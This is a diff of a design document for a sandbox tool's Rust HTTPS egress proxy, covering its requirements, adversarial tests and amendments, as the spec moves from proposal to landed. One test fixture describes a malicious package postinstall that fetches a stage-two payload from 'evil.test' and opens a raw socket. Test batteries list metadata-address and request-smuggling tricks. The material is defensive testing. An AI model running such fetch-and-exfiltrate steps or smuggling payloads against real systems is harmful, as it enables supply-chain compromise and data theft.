@@ -1,9 +1,10 @@
-# FEP-6 (proposal): the egress engine, an in-process Rust HTTP(S) proxy inside the Gateway
+# FEP-6 (landed): the egress engine, an in-process Rust HTTP(S) proxy inside the Gateway
 
-**Formwork Enhancement Proposal 6 — proposal, not landed.** Companion to `formwork.md` (design +
-end-to-end spec), `constitution.md` (doctrine), `docs/fep-1.md` (what host-scoped egress permits) and
-`docs/fep-5.md` (how a confined connection reaches the Gateway, the host-rule grammar, inspection and
-brokering). Motivated by the Omnigent comparison in `docs/omnigent-integration-eval.md`.
+**Formwork Enhancement Proposal 6 — landed, macOS characterization owed.** Companion to
+`formwork.md` (design + end-to-end spec), `constitution.md` (doctrine), `docs/fep-1.md` (what
+host-scoped egress permits) and `docs/fep-5.md` (how a confined connection reaches the Gateway, the
+host-rule grammar, inspection and brokering). Motivated by the Omnigent comparison in
+`docs/omnigent-integration-eval.md`.
 
 FEP-5 specifies what the Gateway enforces for egress and how the confined process's connections
 reach it. It does not specify the program that serves those connections: which protocols it parses,
@@ -11,31 +12,28 @@ how it resolves and pins destinations, how it mints certificates, how it present
 credentials, what it refuses to forward, and what it is built from. This FEP specifies that program,
 the **egress engine**, and records the research behind the build decision.
 
-**Status: nothing in this document mutates the landed spec or the constitution.** Of its §9
-amendments only (g) is applied. Draft identifiers are inline code, as in FEP-5, and start above the
-highest drafted or landed number: FEP-5 drafted, and has since anchored, up to
-`FW-EGR15`, `FW-CRED15`, `FW-FID11`, `FW-BP15`, `FW-INV14`, `FW-E2E-091` and `FW-ADV-020`;
-FEP-4 drafted `FW-INV12` and `FW-DISC7`–`FW-DISC10`. This FEP starts at `FW-EGR16`, `FW-CRED16`,
-`FW-FID12`, `FW-BP16`, `FW-INV15`, `FW-E2E-092` and `FW-ADV-021`. Changes to FEP-5 or FEP-1 drafts
-are listed in §9. §7.2 walks through ten concrete configurations, from a model-API-only agent to a
-corporate proxy, each with a test form the harness runs as written.
+**Status.** The engine is built in `crates/formwork-gateway/src/{egress,http,inspect,upstream,ca}.rs`
+over the pure types of `crates/formwork-blueprint/src/egress.rs`; `docs/fep-6-plan.md` records how,
+every departure from the text below, and what is still owed. The requirements (§6) and tests (§7)
+are defined here, anchored, and code cites them bare. The §9 amendments are applied to `formwork.md`,
+`constitution.md`, `docs/fep-1.md`, `docs/fep-5.md`, the shipped examples and the README, with
+the FEP-5 verbs `https:` and `any:` replaced outright, not aliased: no release has shipped them.
+What remains is the macOS characterization of `FW-CRED16`'s debugger denial, the client matrix
+(`FW-E2E-094`) and the latency budget (`FW-E2E-096`); until they run, the report keeps
+`credential-broker` `Partial` on macOS. Identifiers continue FEP-5's sequences: FEP-5 anchored up to
+`FW-EGR15`, `FW-CRED15`, `FW-FID11`, `FW-BP15`, `FW-INV14`, `FW-E2E-091` and `FW-ADV-020`, and
+FEP-4 drafted `FW-INV12` and `FW-DISC7`–`FW-DISC10`; this FEP mints `FW-EGR16`–26, `FW-CRED16`–19,
+`FW-BP16`, `FW-FID12`–13, `FW-INV15`, `FW-E2E-092`–106 and `FW-ADV-021`–025. §7.2 walks through
+ten concrete configurations, from a model-API-only agent to a corporate proxy, each with a test
+form the harness runs as written.
 
-**Written against the FEP-5 proposal; reconciliation owed.** FEP-5 landed while this FEP was
-drafted (Phases 0–4; `docs/fep-5-plan.md` records how). The known differences:
-
-- The engine exists: `crates/formwork-gateway/src/egress.rs`, `inspect.rs` and `ca.rs`, on `rustls`
-  with `ring`, `rcgen` 0.13 and `rustls-native-certs`. HTTP/1.1 framing (content length and chunked)
-  is written by hand, without `hyper` (`docs/fep-5-plan.md` §3). §3's comparison of options still
-  holds; §5's dependency table and toolchain note describe the composition this FEP recommended, not
-  the landed one, which adds no `hyper` and needs no MSRV change.
-- Host rules landed with `https:` and `any:` (`crates/formwork-blueprint/src/egress.rs`), and the
-  shipped agent examples use `https:` rules (`examples/blueprints/claude-code.toml`). §9 (j) is
-  therefore a code change on adoption, not a text edit.
-- Landed FEP-5 restricts loopback destinations by name (`docs/fep-5-plan.md` §3), a different rule
-  from `FW-EGR19`.
-
-The next step is a requirement-by-requirement comparison of §6 with the landed engine. Until it is
-done, §4 and §6 describe the target design, not the state of `main`.
+**Reconciled with landed FEP-5.** FEP-5 landed while this FEP was drafted (Phases 0–4;
+`docs/fep-5-plan.md` records how). The engine it landed (`egress.rs`, `inspect.rs`, `ca.rs`, on
+`rustls` with `ring`, `rcgen` 0.13 and `rustls-native-certs`, with HTTP/1.1 framing written by hand
+and no `hyper`) is the base this FEP's requirements were built on, requirement by requirement; the
+plan records each change. §3's comparison of options holds; §5's dependency table describes the
+composition this FEP recommended, and the plan the one built, which adds no crate and needs no MSRV
+change. Landed FEP-5 restricted loopback destinations by name; `FW-EGR19` replaces that rule.
 
 **The question that opened this FEP.** Omnigent does not use Envoy, Squid or mitmproxy. Its egress
 proxy is about 2,900 lines of its own Python (asyncio, the standard-library `ssl` module, and
@@ -644,38 +642,40 @@ Together they add 34 crates on Linux, among them `ring`, `rustls-webpki`, `http`
 keychain. HTTP/2 would add 5 more (`h2`, `slab`, `fnv`, `tokio-util`, `futures-sink`).
 
 **Toolchain.** `rcgen` 0.14.8 and later, and `time` 0.3.47 and later (the RUSTSEC-2026-0009 fix),
-need Rust 1.88, so the workspace `rust-version` rises from 1.85 to 1.88.
+need Rust 1.88, so adopting this table would raise the workspace `rust-version` from 1.85 to 1.88.
+As built (`docs/fep-6-plan.md` §3) the engine stays on the landed `rcgen` 0.13 and `time` 0.3.44 and
+adds no crate, and the MSRV stays 1.85.
 
 ---
 
-## 6. Proposed requirements (draft numbering — anchored on landing)
+## 6. Requirements
 
 These continue the EGR, CRED, BP, FID and INV families. One obligation per ID; rationale lives in §4.
 
 | Req | Requirement |
 |---|---|
-| `FW-EGR16` Tunnel server name | For a tunnel-grade host, the Gateway shall forward bytes upstream only after buffering a complete TLS ClientHello whose server name equals the canonical CONNECT host, and shall refuse a connection whose first byte is not a TLS handshake record. |
-| `FW-EGR17` Single resolution | Before connecting upstream, the Gateway shall resolve the host once, classify every returned address, including any IPv4 address embedded in an IPv6 address, refuse the connection if any address is in a class the matching rule does not admit, and connect only to addresses from that resolution. |
-| `FW-EGR18` Gateway self-exclusion | The Gateway shall refuse every upstream connection to its own listener endpoints. |
-| `FW-EGR19` Local and private admission | The Gateway shall admit a loopback, private, shared, link-local or host-interface address other than a metadata address only for a host matched by an exact-name or IP-literal rule. |
-| `FW-EGR20` Inspected ALPN | For an inspected host, the Gateway shall offer only `http/1.1` in ALPN and shall refuse a ClientHello whose ALPN list is present and excludes `http/1.1`. |
-| `FW-EGR21` Streamed bodies | The Gateway shall forward request and response bodies as they arrive, holding at most **body-buffer** bytes of a body per direction in memory. |
-| `FW-EGR22` Authorized forwarding | For an inspected request, the Gateway shall send upstream a request line built from the method and canonical path that matched, with hop-by-hop headers and `Proxy-Authorization` removed. |
-| `FW-EGR23` Reflective methods | On an inspected host, the Gateway shall refuse TRACE and CONNECT requests under every rule. |
-| `FW-EGR24` Upstream verification | The Gateway shall verify every upstream TLS certificate for the requested host name against the host trust store it loaded at session start, and shall never trust the session CA or a file a confined process can write for upstream verification. |
-| `FW-EGR25` Constrained session CA | The session CA certificate shall carry name constraints whose permitted subtrees are exactly the session's inspected exact names, wildcard suffixes and IP literals. |
-| `FW-EGR26` Upstream proxy | When `formwork run`'s environment names an upstream proxy, the Gateway shall send admitted egress through it, except to hosts that environment's `NO_PROXY` exempts, and shall report destination classification `Partial` with the reason for each proxied host. |
-| `FW-CRED16` Broker custody | When the blueprint brokers a credential, the Gateway process shall be non-dumpable (Linux) or deny debugger attachment (macOS) from before it spawns the workload until it exits. |
-| `FW-CRED17` Reflection guard | For a response to a request on which it presented a brokered credential, the Gateway shall request identity content coding, refuse a response with another content coding, and end the response without releasing any byte that begins an occurrence of a wire encoding of the presented credential. |
-| `FW-CRED18` No credential on OPTIONS | The Gateway shall not present a brokered credential on an OPTIONS request. |
-| `FW-CRED19` No credential in cleartext | The Gateway shall present a brokered credential only on a request it forwards to the upstream over TLS. |
-| `FW-BP16` Host target shape | The Blueprint parser shall read a rule target as a path pattern when it begins with `/`, `~` or `$`, and otherwise as a host target, which it shall accept only if the host contains a dot, is `localhost`, or is an IP literal. |
-| `FW-FID12` Egress refusal reasons | Every egress violation record shall carry exactly one reason from the closed set in §4.10. |
-| `FW-FID13` Egress grant records | For each admitted tunnel and inspected request, the Gateway shall emit a grant record with host, grade, method, canonical path, status, byte counts and duration, and no header value, body byte or query string. |
+| <a id="fw-egr16"></a>**FW-EGR16** Tunnel server name | For a tunnel-grade host, the Gateway shall forward bytes upstream only after buffering a complete TLS ClientHello whose server name equals the canonical CONNECT host, and shall refuse a connection whose first byte is not a TLS handshake record. |
+| <a id="fw-egr17"></a>**FW-EGR17** Single resolution | Before connecting upstream, the Gateway shall resolve the host once, classify every returned address, including any IPv4 address embedded in an IPv6 address, refuse the connection if any address is in a class the matching rule does not admit, and connect only to addresses from that resolution. |
+| <a id="fw-egr18"></a>**FW-EGR18** Gateway self-exclusion | The Gateway shall refuse every upstream connection to its own listener endpoints. |
+| <a id="fw-egr19"></a>**FW-EGR19** Local and private admission | The Gateway shall admit a loopback, private, shared, link-local or host-interface address other than a metadata address only for a host matched by an exact-name or IP-literal rule. |
+| <a id="fw-egr20"></a>**FW-EGR20** Inspected ALPN | For an inspected host, the Gateway shall offer only `http/1.1` in ALPN and shall refuse a ClientHello whose ALPN list is present and excludes `http/1.1`. |
+| <a id="fw-egr21"></a>**FW-EGR21** Streamed bodies | The Gateway shall forward request and response bodies as they arrive, holding at most **body-buffer** bytes of a body per direction in memory. |
+| <a id="fw-egr22"></a>**FW-EGR22** Authorized forwarding | For an inspected request, the Gateway shall send upstream a request line built from the method and canonical path that matched, with hop-by-hop headers and `Proxy-Authorization` removed. |
+| <a id="fw-egr23"></a>**FW-EGR23** Reflective methods | On an inspected host, the Gateway shall refuse TRACE and CONNECT requests under every rule. |
+| <a id="fw-egr24"></a>**FW-EGR24** Upstream verification | The Gateway shall verify every upstream TLS certificate for the requested host name against the host trust store it loaded at session start, and shall never trust the session CA or a file a confined process can write for upstream verification. |
+| <a id="fw-egr25"></a>**FW-EGR25** Constrained session CA | The session CA certificate shall carry name constraints whose permitted subtrees are exactly the session's inspected exact names, wildcard suffixes and IP literals. |
+| <a id="fw-egr26"></a>**FW-EGR26** Upstream proxy | When `formwork run`'s environment names an upstream proxy, the Gateway shall send admitted egress through it, except to hosts that environment's `NO_PROXY` exempts, and shall report destination classification `Partial` with the reason for each proxied host. |
+| <a id="fw-cred16"></a>**FW-CRED16** Broker custody | When the blueprint brokers a credential, the Gateway process shall be non-dumpable (Linux) or deny debugger attachment (macOS) from before it spawns the workload until it exits. |
+| <a id="fw-cred17"></a>**FW-CRED17** Reflection guard | For a response to a request on which it presented a brokered credential, the Gateway shall request identity content coding, refuse a response with another content coding, and end the response without releasing any byte that begins an occurrence of a wire encoding of the presented credential. |
+| <a id="fw-cred18"></a>**FW-CRED18** No credential on OPTIONS | The Gateway shall not present a brokered credential on an OPTIONS request. |
+| <a id="fw-cred19"></a>**FW-CRED19** No credential in cleartext | The Gateway shall present a brokered credential only on a request it forwards to the upstream over TLS. |
+| <a id="fw-bp16"></a>**FW-BP16** Host target shape | The Blueprint parser shall read a rule target as a path pattern when it begins with `/`, `~`, `$` or `**`, and otherwise as a host target, which it shall accept only if the host contains a dot, is `localhost`, or is an IP literal. |
+| <a id="fw-fid12"></a>**FW-FID12** Egress refusal reasons | Every egress violation record shall carry exactly one reason from the closed set in §4.10. |
+| <a id="fw-fid13"></a>**FW-FID13** Egress grant records | For each admitted tunnel and inspected request, the Gateway shall emit a grant record with host, grade, method, canonical path, status, byte counts and duration, and no header value, body byte or query string. |
 
 Invariant:
 
-- `FW-INV15` **Unparsed is unforwarded.** No byte from a confined process reaches an upstream unless
+- <a id="fw-inv15"></a>**FW-INV15 — Unparsed is unforwarded.** No byte from a confined process reaches an upstream unless
   the engine parsed it as part of an admitted TLS ClientHello, an admitted request head, or the body
   or tunnel that follows one.
 
@@ -720,8 +720,9 @@ no external network).
 ### 7.2 Scenarios
 
 Each scenario is a configuration an operator would write, where it fits, how the engine serves it,
-and a test form the harness runs as written. The transcripts and expected results are specified,
-not captured: the engine does not exist yet. Several scenarios overlap FEP-5's `FW-E2E-075`, `077`,
+and a test form the harness runs as written. The transcripts are illustrative; the expected results
+are the contract, and `docs/fep-6-plan.md` §4 maps each test form to where it runs. Several
+scenarios overlap FEP-5's `FW-E2E-075`, `077`,
 `078`, `084` and `085` and the tests in §7.3; each names the overlap and adds the integrated flow.
 Each test form lists steps run inside the session (`formwork run --blueprint <file> -- sh -c ...`)
 unless marked "outside", and is checked after the process tree exits.
@@ -793,7 +794,7 @@ suggests `tunnel:` for it (FEP-5 `FW-FID9`). With `tunnel:api.github.com` in pla
 rule, the Gateway forwards that host's connections after the server-name check (§4.3). The host loses
 method, path and `Host` checks and brokering, and its verdict is `Partial`.
 
-**Test form — `FW-E2E-098` (Phase B, both OSes; row 9 alone runs from Phase A).**
+<a id="fw-e2e-098"></a>**FW-E2E-098: test form (Phase B, both OSes; row 9 alone runs from Phase A).**
 `api.anthropic.com` becomes `model.test`; `blocked.test` is a second fixture. `$FIXTURE_CA` is the
 test CA's certificate, readable in the session.
 
@@ -845,7 +846,7 @@ in its API-key mode; in OAuth mode it lifts `claude` and brokers nothing (FEP-5 
    `Accept-Encoding: identity`, and forwards over the pooled upstream connection.
 6. The server-sent-event response streams back through the reflection guard (§4.7), event by event.
 
-**Test form — `FW-E2E-099` (Phase B, both OSes; extends FEP-5 `FW-E2E-078`).** `api.anthropic.com`
+<a id="fw-e2e-099"></a>**FW-E2E-099: test form (Phase B, both OSes; extends FEP-5 `FW-E2E-078`).** `api.anthropic.com`
 becomes `model.test`. Catalog bindings name production hosts, so the test uses an inline binding
 (FEP-5 `FW-BP12`):
 `allow-credentials = [{ name = "model-fixture", env = "FIXTURE_MODEL_KEY", hosts = ["model.test"], scheme = "header:x-api-key" }]`,
@@ -910,7 +911,7 @@ Scope the token itself to the repository (a fine-grained token), or use the REST
 macOS `gh` verifies through Security.framework and refuses the session CA (FEP-5 §3.2); `git` and
 `curl` read the CA variables.
 
-**Test form — `FW-E2E-100` (Phase B, both OSes).** `github.com` becomes `git.test`, a fixture that
+<a id="fw-e2e-100"></a>**FW-E2E-100: test form (Phase B, both OSes).** `github.com` becomes `git.test`, a fixture that
 wraps `git http-backend` over bare repositories `acme/widgets.git` and `acme/other.git` and accepts
 pushes only with the fixture token. `api.github.com` becomes `api.git.test`, a REST fixture. An
 inline binding carries one scheme, so the test uses two:
@@ -966,7 +967,7 @@ The hosts are inspected, so a rule can narrow them by method. `get,head:registry
    is a local or private address (§4.5): an attacker who controls a subdomain cannot point it at the
    runner's metadata service or its loopback.
 
-**Test form — `FW-E2E-101` (Phase B, both OSes; row 3 Linux only, §7.1).** `registry.npmjs.org`
+<a id="fw-e2e-101"></a>**FW-E2E-101: test form (Phase B, both OSes; row 3 Linux only, §7.1).** `registry.npmjs.org`
 becomes `npm.test`, a static registry fixture serving `fixture-pkg`, whose `postinstall` runs
 `curl -sS https://evil.test/stage2 || true; node -e "require('net').connect(443, '198.51.100.7')"`.
 `pypi.org` and `files.pythonhosted.org` become `pypi.test` (a static simple index) and
@@ -1016,7 +1017,7 @@ exact names for user-content domains.
 3. A leaf is minted for each subdomain the first time it is used.
 4. `api.anthropic.com` gets `allow:`, every method; each host has exactly one grade (FEP-5 `FW-BP14`).
 
-**Test form — `FW-E2E-102` (Phase B, both OSes; row 5 Linux only).** `docs.python.org` becomes
+<a id="fw-e2e-102"></a>**FW-E2E-102: test form (Phase B, both OSes; row 5 Linux only).** `docs.python.org` becomes
 `docs.test`; `*.readthedocs.io` becomes `*.rtd.test`; `api.anthropic.com` becomes `model.test`.
 
 | # | Step | Expected |
@@ -1080,7 +1081,7 @@ in-namespace relay is the upstream proxy (`HTTPS_PROXY`), and Omnigent's MITM CA
 apply, so a host must pass both. If both layers broker the same credential, Formwork adds the header
 first and Omnigent, which never overwrites a present header, forwards it.
 
-**Test form — `FW-E2E-103` (Phase C, both OSes).** `proxy.test` is a CONNECT-proxy fixture that
+<a id="fw-e2e-103"></a>**FW-E2E-103: test form (Phase C, both OSes).** `proxy.test` is a CONNECT-proxy fixture that
 records each CONNECT line and forwards to the fixture addresses. `model.test` is reached through it.
 `git.corp.test` is a fixture on `127.0.0.2`. `formwork run` gets `HTTPS_PROXY=http://proxy.test:3128`
 and `NO_PROXY=.corp.test`.
@@ -1105,7 +1106,7 @@ headers in the body; `?gzip=1` compresses; `?in=header` echoes into a response h
 Each row names the mechanism that stops it, and the last row is what the configuration admits by
 design.
 
-**Test form — `FW-ADV-025` (Phase B, both OSes).**
+<a id="fw-adv-025"></a>**FW-ADV-025: test form (Phase B, both OSes).**
 
 | # | Attempt | Step | Expected | Mechanism |
 |---|---|---|---|---|
@@ -1130,7 +1131,7 @@ any refusal row reaches a fixture, or a key byte sequence reaches the session.
 mistake that would otherwise produce a sandbox other than the one written; the compiler refuses it
 and names the lines, before anything runs.
 
-**Test form — `FW-E2E-104` (Phase A for rows 1, 4–7a and 8; Phase B for rows 2, 3 and 7b; pure
+<a id="fw-e2e-104"></a>**FW-E2E-104: test form (Phase A for rows 1, 4–7a and 8; Phase B for rows 2, 3 and 7b; pure
 compile, both OSes).** Each row runs outside the session:
 `formwork compile --report-only --blueprint <file>`.
 
@@ -1182,7 +1183,7 @@ compromised package's `postinstall` requests
 4. `npm ci` stops at its first failed fetch, so a pipeline with several missing hosts can take one
    `learn` pass per host.
 
-**Test form — `FW-E2E-105` (Phase B, both OSes; extends FEP-5 `FW-E2E-085`).**
+<a id="fw-e2e-105"></a>**FW-E2E-105: test form (Phase B, both OSes; extends FEP-5 `FW-E2E-085`).**
 `registry.npmjs.org`, `codeload.github.com` and `telemetry.evil.example` become `npm.test`,
 `codeload.test` and `evil.test`.
 
@@ -1209,7 +1210,7 @@ the Gateway endpoint (§11, "In-session loopback"). The resolution this test acc
 sets `NO_PROXY=localhost,127.0.0.1,::1`, and the supervisor admits a loopback `connect()` whose port
 is bound by a session process.
 
-**Test form — `FW-E2E-106` (blocked on §11; Linux first).** A harness fixture outside the session
+<a id="fw-e2e-106"></a>**FW-E2E-106: test form (blocked on §11; Linux first).** A harness fixture outside the session
 listens on `127.0.0.1:<port>`.
 
 | # | Step | Expected |
@@ -1224,46 +1225,46 @@ macOS form waits for a Seatbelt design that can tell a session-bound port from a
 
 Draft numbers continue above `FW-E2E-091` and `FW-ADV-020`.
 
-- `FW-E2E-092` **Chunked and large uploads (both).** Against an inspected fixture: a `git push` of a
+- <a id="fw-e2e-092"></a>**FW-E2E-092: Chunked and large uploads (both).** Against an inspected fixture: a `git push` of a
   pack larger than 1 MiB, and a 256 MiB `POST` from curl. Pass: the fixture receives both bodies
   byte-identical, and the Gateway's resident memory grows by less than 16 MiB during the upload.
   Fail: either body differs or stalls, or memory grows past the bound.
-- `FW-E2E-093` **Streaming (both).** A fixture emits one server-sent event every 200 ms for 30 s on
+- <a id="fw-e2e-093"></a>**FW-E2E-093: Streaming (both).** A fixture emits one server-sent event every 200 ms for 30 s on
   an inspected host with a brokered credential. Pass: every event reaches the client within 20 ms of
   the fixture writing it. Fail: any event is later.
-- `FW-E2E-094` **Client matrix (both).** curl, git, Python `requests`, Python `urllib`, pip, Node
+- <a id="fw-e2e-094"></a>**FW-E2E-094: Client matrix (both).** curl, git, Python `requests`, Python `urllib`, pip, Node
   `fetch` and `https` with the Launcher's variables, npm, Go `net/http`, uv, cargo and rustup each
   fetch from a tunnel fixture and an inspected fixture. Pass: the results match the matrix recorded
   in the repository, which also records name-constraint enforcement per client. Fail: a result
   differs from the recorded matrix.
-- `FW-E2E-095` **Upstream reuse (both).** Twenty sequential requests from one client to one
+- <a id="fw-e2e-095"></a>**FW-E2E-095: Upstream reuse (both).** Twenty sequential requests from one client to one
   inspected fixture. Pass: the fixture observes one TLS handshake. Fail: more than one.
-- `FW-E2E-096` **Latency budget (both).** Medians over 1,000 requests against a loopback fixture,
+- <a id="fw-e2e-096"></a>**FW-E2E-096: Latency budget (both).** Medians over 1,000 requests against a loopback fixture,
   compared with the same client connecting directly. Pass: the §9 (f) targets. Fail: any median
   exceeds its target.
-- `FW-E2E-097` **Session CA shape (both).** Pass: the bundle's session certificate is a CA with path
+- <a id="fw-e2e-097"></a>**FW-E2E-097: Session CA shape (both).** Pass: the bundle's session certificate is a CA with path
   length 0 and the name constraints `FW-EGR25` lists; no file under the session scratch, `$HOME` or
   the temporary directories contains the CA private key after the session starts; the leaf for an
   inspected host verifies with `openssl verify` against the bundle. Fail: any of these does not
   hold.
-- `FW-ADV-021` **Credential reflection.** Under `broker:anthropic` bound to `allowed.test`, the
+- <a id="fw-adv-021"></a>**FW-ADV-021: Credential reflection.** Under `broker:anthropic` bound to `allowed.test`, the
   fixture echoes the request's `x-api-key` in its body with the value split across two writes 50 ms
   apart, in a response header, and in a gzip-encoded body; the client also sends TRACE. Pass: no
   byte sequence of length 8 or more from the credential reaches the client, and each case emits
   `reflection` or a TRACE refusal. Fail: any credential sequence reaches the client.
-- `FW-ADV-022` **Name disagreement.** A CONNECT to `allowed.test` with server name `blocked.test`; a
+- <a id="fw-adv-022"></a>**FW-ADV-022: Name disagreement.** A CONNECT to `allowed.test` with server name `blocked.test`; a
   matching server name with `Host: blocked.test` inside an inspected tunnel; a tunnel whose first
   byte is not `0x16`; a ClientHello offering only `h2` to an inspected host. Pass: each is refused
   with `sni-mismatch`, `host-mismatch`, `not-tls` or `alpn`, and the blocked fixture sees no
   connection. Fail: any reaches a fixture.
-- `FW-ADV-023` **Address classes.** Under `allow:*.test`, the resolver fixture answers
+- <a id="fw-adv-023"></a>**FW-ADV-023: Address classes.** Under `allow:*.test`, the resolver fixture answers
   `127.0.0.1`, `10.0.0.1`, `100.100.100.200`, `168.63.129.16`, `::ffff:169.254.169.254`,
   `64:ff9b::a9fe:a9fe`, `2002:a9fe:a9fe::1`, `fe80::1`, a public address mixed with `10.0.0.1`, an
   address of the runner's own interfaces, and the Gateway's own listener address. Then, under the
   exact rule `allow:allowed.test`, it answers `127.0.0.1` and then `169.254.169.254`. Pass: every
   wildcard case and the exact-name metadata case are refused with `address-class`, and the
   exact-name loopback case is admitted. Fail: any other outcome.
-- `FW-ADV-024` **Parser battery (`FW-INV15`).** Heads carrying both `Content-Length` and
+- <a id="fw-adv-024"></a>**FW-ADV-024: Parser battery (`FW-INV15`).** Heads carrying both `Content-Length` and
   `Transfer-Encoding`, two differing `Content-Length` values, obsolete line folding, a bare LF, a NUL
   in a header value, an invalid method token, a head over **head-limit**, CONNECT authorities with
   userinfo, a path, a zone identifier, a percent-encoded dot, or a numeric spelling (`2130706433`,
@@ -1275,11 +1276,9 @@ targets once the fuzz infrastructure that `docs/STATUS.md` defers exists.
 
 ### 7.4 Phasing
 
-Each phase lands with the FEP-5 phase that needs it, and the report is honest at every boundary.
-A phase is accepted when the §7.2 scenarios marked with it pass on both CI operating systems.
-With inspection the default (§9 j), Phase A alone serves `tunnel:` rules only; until Phase B lands,
-the compiler refuses `allow:` and method rules and names the missing phase
-([FW-XR9](../formwork.md#fw-xr9)).
+Phases A, B and C landed together; the HTTP/2 spike has not run. The phases below record the order
+the requirements depend on one another, and `docs/fep-6-plan.md` §4 which scenario tests run
+where.
 
 - **Phase A**, with FEP-5 Phase 2: the front door, authority parsing, the host table, destination
   classification, tunnel grade, plain HTTP, records. `FW-EGR16`–`FW-EGR19`, `FW-EGR21`,
@@ -1311,10 +1310,10 @@ Conditional on FEP-5's transport landing and on the **(characterize)** marks abo
 
 ---
 
-## 9. Proposed amendments (apply on landing)
+## 9. Amendments (applied on landing)
 
-None of these are applied yet except (g). FEP-5 has landed, so an amendment to one of its drafts is
-now a change to landed text and, where that text is implemented, to code.
+All are applied. FEP-5 had landed, so each amendment to one of its drafts was a change to landed text
+and, where that text is implemented, to code.
 
 **(a) FEP-5 `FW-CRED11`.** Replace "refusing with a violation record where the placeholder is
 carried toward any other host" with "refusing with a violation record where the placeholder appears
@@ -1393,8 +1392,9 @@ the default.** Replace the host-rule atoms `any` and `https` with `allow` and `t
   (`crates/formwork-blueprint/src/egress.rs`), the `learn` proposals (`discovery.rs`), the compiler
   messages (`credential.rs`), the shipped examples and their tests. Adopting (j) changes each of
   them, and changes the shipped examples' hosts from tunnel to inspected, so their clients must trust
-  the session CA. The old spellings stay as aliases, recorded in the `docs/STATUS.md` deprecations
-  register with removal at the first tagged release (constitution Precedence & Conflicts).
+  the session CA. The old spellings are removed, not aliased: no tagged release has shipped them, so
+  there is no released surface to deprecate (constitution Precedence & Conflicts), and a blueprint
+  that still writes `https:` or `any:` is refused at parse with the verbs to use.
 
 ---
 
